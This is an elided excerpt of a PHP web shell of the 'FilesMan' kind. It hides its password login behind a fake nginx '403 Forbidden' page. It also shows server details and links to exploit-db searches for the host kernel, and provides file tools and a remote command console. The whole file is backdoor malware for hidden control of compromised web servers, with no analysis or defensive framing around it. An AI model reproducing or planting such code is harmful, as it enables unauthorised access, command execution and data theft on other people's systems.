...
//-----------------Password---------------------
$▛ = "f0d4a5dd65f77057538dd6f85da4b711";
$▘ = true;
$▜ = "UTF-8";
$▚ = "FilesMan";
...
function hardLogin()
{
    ...
    die("</br></br><pre align=center><form method=post  text-align: center;'>
    <html><head><title>403 Forbidden</title></head><body><center><h1>403 Forbidden</h1></center><hr><center>nginx/1.24.0 (Ubuntu)</center></body></html><input placeholder='' type=password name=pass style='border-radius: 4px 0px 0px 4px; background-color:whitesmoke;border:1px solid #FFF;outline:none;' required><input type=submit name='watching' value='...' style='height: 20px;</form></pre><div class='view'><div class='plane main'><div class='circle'></div><div class='circle'></div><div class='circle'></div><div class='circle'></div><div class='circle'></div><div class='circle'></div></div></div>
");
}
...
<input type=hidden name=charset>
    ...
    $kernel = @php_uname("s");
    $explink =
        "http://nullrefer.com/?https://www.exploit-db.com/search/?action=search&description=";
    ...
    echo "<table class=info cellpadding=3 cellspacing=0 width=100%><tr><td width=1><span>Uname:<br>User:<br>Php:<br>Hdd:<br>Cwd:" .
        ...
        ' <a href="https://nullrefer.com/?https://www.google.com/search?q=' .
        urlencode(@php_uname()) .
        ...
        " <span>Safe mode:</span> " .
        ($GLOBALS["safe_mode"]
            ? "<font color=#a10705>ON</font>"
            : "<font color=#f9c440><b>OFF</b></font>") .
        ...
        $_SERVER["REMOTE_ADDR"] .
        "</nobr></td></tr></table>" .
        '<table style="background-color:#0d52bf;" cellpadding=3 cellspacing=0 width=100%><tr>' .
        $menu .
        "</tr></table><div>";
}
function hardFooter()
{
    $is_writable = is_writable($GLOBALS["cwd"])
        ? " <font color='#f9c440'>[ Writeable ]</font>"
        : " <font color=#a10705>(Not writable)</font>";
    echo "
</div>
...
function actionFilesTools()
{
    ...
    switch ($_POST["p2"]) {
        ...
        case "hexdump":
            ...
            echo '<table cellspacing=1 cellpadding=5 bgcolor=#1a1a1a><tr><td bgcolor=#202832><span style="font-weight: normal;"><pre>' .
                $h[0] .
...
function add(cmd) {
    ...
    echo '</select></label><input type=button onclick="add(d.cf.alias.value);if(d.cf.ajax.checked){a(null,null,d.cf.alias.value,d.cf.show_errors.checked?1:\'\');}else{g(null,null,d.cf.alias.value,d.cf.show_errors.checked?1:\'\');}" value="submit"> <nobr><input type=checkbox name=ajax value=1 ' .
        ...
        $_COOKIE[md5($_SERVER["HTTP_HOST"]) . "stderr_to_out"]
            ? "checked"
            : "") .
        '> redirect stderr to stdout (2>&1)</nobr><br/><textarea class=bigarea name=output style="border-bottom:0;margin-top:5px;" readonly>';
    if (!empty($_POST["p1"])) {
